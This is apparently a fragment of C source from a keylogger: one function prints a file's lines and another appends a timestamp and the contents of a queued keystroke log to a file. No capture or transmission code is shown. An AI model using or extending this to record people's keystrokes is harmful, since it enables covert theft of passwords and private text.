#include "settings.h"

int read_file (char* toReadName) {

    char line[MAX_LINE_LENGTH];
    FILE* toRead = fopen(toReadName, "r+");
    int i = 0;

    if (!toRead) return -1;
    
    printf("Reading: %s\n", toReadName);
    while (fgets(line, MAX_LINE_LENGTH, toRead)) {
        printf("%d\t%s", i, line);
        i++;
    }

    int closeFile = fclose(toRead);
    if (closeFile != 0) return -1;
    return 0;
}

int write_file (char* toReadName, struct KeyLogQueue* q, int firstCall) {
    FILE* toRead = fopen(toReadName, "a+");

    if (!toRead) return -1;
    
    if (firstCall) {
        time_t t;
        time(&t);
        fprintf(toRead, "\n----\n%s----\n", ctime(&t));
    }
    
    while (q->last != NULL) {
        struct KeyLogNode* tmp = DequeueKeyLogNode(q);
        fprintf(toRead, "%s", tmp->data);
        free(tmp);
        tmp = NULL;
    }
    int closeFile = fclose(toRead);
    if (closeFile != 0) return -1;
    return 0;     
}
